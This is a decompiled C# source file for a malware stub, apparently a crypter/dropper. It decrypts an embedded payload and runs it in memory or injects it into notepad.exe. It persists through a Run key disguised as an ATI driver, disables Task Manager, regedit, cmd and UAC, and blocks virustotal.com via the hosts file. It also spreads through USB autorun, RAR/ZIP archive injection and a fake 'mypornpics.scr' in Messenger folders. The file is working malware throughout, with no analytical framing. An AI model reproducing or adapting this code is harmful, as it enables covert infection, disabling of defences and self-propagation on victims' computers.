using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Cci;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class Stub
{
	public static string fakeerror = Conversions.ToString(false);

	public static string autostart = Conversions.ToString(false);

	public static string uac = Conversions.ToString(false);

	public static string virustotal = Conversions.ToString(false);

	public static string taskmanager = Conversions.ToString(false);

	public static string regedit = Conversions.ToString(false);

	public static string cmd = Conversions.ToString(false);

	public static string Melt = Conversions.ToString(false);

	public static string usbspr = Conversions.ToString(false);

	public static string rarspr = Conversions.ToString(false);

	public static string msnspr = Conversions.ToString(false);

	public static string yahoospr = Conversions.ToString(false);

	public static string faketitle = "";

	public static string fakemessage = "";

	public static string key = "74335455f59a429c9aa40f25f5405e11";

	public static string rarPath;

	public static string copiedExeName;

	public static byte[] resourcesBuffer;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExitProcess(uint uExitCode);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	public static int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength)
	{
		return 0;
	}

	[STAThread]
	public static void Main()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(virustotal))
		{
			antvt();
		}
		if (Conversions.ToBoolean(taskmanager))
		{
			task();
		}
		if (Conversions.ToBoolean(regedit))
		{
			regg();
		}
		if (Conversions.ToBoolean(cmd))
		{
			mcd();
		}
		if (Conversions.ToBoolean(usbspr))
		{
			usb();
		}
		if (Conversions.ToBoolean(fakeerror))
		{
			MessageBox.Show(faketitle, fakemessage, (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		HinzAutostart();
		if (Conversions.ToBoolean(uac))
		{
			acu();
		}
		if (Conversions.ToBoolean(rarspr))
		{
			Spread("KeyGen.exe");
		}
		if (Conversions.ToBoolean(msnspr))
		{
			msn();
		}
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("file.txt");
		resourcesBuffer = new byte[checked((int)(manifestResourceStream.Length - 1L) + 1)];
		manifestResourceStream.Read(resourcesBuffer, 0, resourcesBuffer.Length);
		manifestResourceStream.Close();
		DeCrypt(resourcesBuffer, Encoding.UTF8.GetBytes(key));
		try
		{
			MetadataHelper.Run(resourcesBuffer, "", "C:\\Windows\\System32\\notepad.exe");
			if (Conversions.ToBoolean(Melt))
			{
				MeltFile();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread = new Thread(RunNETexe);
			thread.Start();
			if (Conversions.ToBoolean(Melt))
			{
				MeltFile();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static void MeltFile()
	{
		string executablePath = Application.get_ExecutablePath();
		string lpFileName = Application.get_ExecutablePath();
		MoveFileExW(Strings.Left(executablePath, GetModuleFileNameA(0, ref lpFileName, 256)), Path.GetTempPath() + "\\tmpG" + DateTime.Now.Millisecond + ".tmp", 8L);
		ExitProcess(0u);
	}

	public static void task()
	{
		try
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void cmdd()
	{
		try
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void mcd()
	{
		try
		{
			if (Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System") == null)
			{
				Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void acu()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void antvt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath + "\\drivers\\etc\\\\hosts";
		StreamWriter streamWriter = new StreamWriter(path);
		streamWriter.Write("127.0.0.1 www.virustotal.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Dispose();
	}

	public static void usb()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.DriveType == DriveType.Removable)
				{
					string fileName = Process.GetCurrentProcess().MainModule!.FileName;
					if (File.Exists(driveInfo.Name + "autorun.exe"))
					{
						File.Delete(driveInfo.Name + "autorun.exe");
					}
					FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
					byte[] array = new byte[checked((int)(fileStream.Length - 1L) + 1)];
					fileStream.Read(array, 0, array.Length);
					fileStream.Close();
					FileStream fileStream2 = new FileStream(driveInfo.Name + "autorun.exe", FileMode.Create);
					fileStream2.Write(array, 0, array.Length);
					fileStream2.Close();
					fileStream2.Dispose();
					File.SetAttributes(driveInfo.Name + "autorun.exe", File.GetAttributes(driveInfo.Name + "autorun.exe") | FileAttributes.Hidden);
					if (File.Exists(driveInfo.Name + "autorun.inf"))
					{
						File.Delete(driveInfo.Name + "autorun.inf");
					}
					StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=autorun.exe");
					streamWriter.Close();
					File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Search(string pathName)
	{
		string[] files = Directory.GetFiles(pathName);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				RarStart(text);
			}
			if (text.Contains(".zip"))
			{
				RarStart(text);
			}
		}
		string[] directories = Directory.GetDirectories(pathName);
		string[] array2 = directories;
		foreach (string pathName2 in array2)
		{
			Search(pathName2);
		}
	}

	public static void Spread(string myExeName)
	{
		copiedExeName = myExeName;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string pathName in array)
		{
			Search(pathName);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Update\\temp48.txt");
	}

	public static void RarStart(string archiveToInject)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(rarPath))
		{
			if (!File.Exists(Path.Combine(path, copiedExeName)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, copiedExeName));
			}
			object obj = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, copiedExeName), (StringBuilder)obj, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
			string text = obj.ToString();
			object obj2 = new StringBuilder(255);
			GetShortPathName(archiveToInject, (StringBuilder)obj2, Conversions.ToInteger(NewLateBinding.LateGet(obj2, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = " a " + Convert.ToString(RuntimeHelpers.GetObjectValue(obj2)) + " " + text;
				processStartInfo.FileName = rarPath;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void regg()
	{
		try
		{
			if (Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System") == null)
			{
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void msn()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string text = default(string);
		string[] directories = default(string[]);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 320:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_003e;
						case 6:
							goto IL_0059;
						case 7:
							goto IL_005e;
						case 8:
							goto IL_0060;
						case 9:
							goto IL_006a;
						case 10:
							goto IL_0080;
						case 11:
							goto IL_00a1;
						case 12:
							goto IL_00be;
						case 13:
						case 14:
						case 15:
							goto IL_00da;
						default:
							goto end_IL_0000;
						case 16:
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00da:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_007a;
					IL_0007:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_001a;
					IL_001a:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0022;
					IL_0022:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_003e;
					IL_003e:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_0059;
					IL_0059:
					num = 6;
					num5 = 0;
					goto IL_005e;
					IL_005e:
					num = 7;
					goto IL_0060;
					IL_0060:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_006a;
					IL_006a:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_007a;
					IL_007a:
					if (num5 > upperBound)
					{
						goto end_IL_0000_2;
					}
					goto IL_0080;
					IL_0080:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00a1;
					}
					goto IL_00da;
					IL_00a1:
					num = 11;
					if (!File.Exists(directories[num5] + "\\mypornpics.scr"))
					{
						goto IL_00be;
					}
					goto IL_00da;
					IL_00be:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\mypornpics.scr");
					goto IL_00da;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 320;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] DeCrypt(byte[] Data, byte[] key)
	{
		checked
		{
			for (int i = Data.Length * 2 + key.Length; i >= 0; i += -1)
			{
				Data[unchecked(i % Data.Length)] = (byte)unchecked(checked(unchecked(Data[i % Data.Length] ^ key[i % key.Length]) - unchecked((int)Data[checked(i + 1) % Data.Length]) + 256) % 256);
			}
			return Data;
		}
	}

	public static void HinzAutostart()
	{
		try
		{
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\" + ((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName() + ".exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Assembly.GetEntryAssembly()!.Location, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\" + ((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName() + ".exe");
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("ATI Display Driver", ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\" + ((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName() + ".exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void RunNETexe()
	{
		try
		{
			Assembly assembly = Assembly.Load(resourcesBuffer);
			MethodInfo entryPoint = assembly.EntryPoint;
			entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name)))), new object[1] { new string[0] });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				Assembly assembly2 = Assembly.Load(resourcesBuffer);
				MethodInfo entryPoint2 = assembly2.EntryPoint;
				RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly2.CreateInstance(entryPoint2.Name)));
				entryPoint2.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly2.CreateInstance(entryPoint2.Name)))), new object[0]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					Assembly.Load(resourcesBuffer).EntryPoint!.Invoke(null, null);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}
}
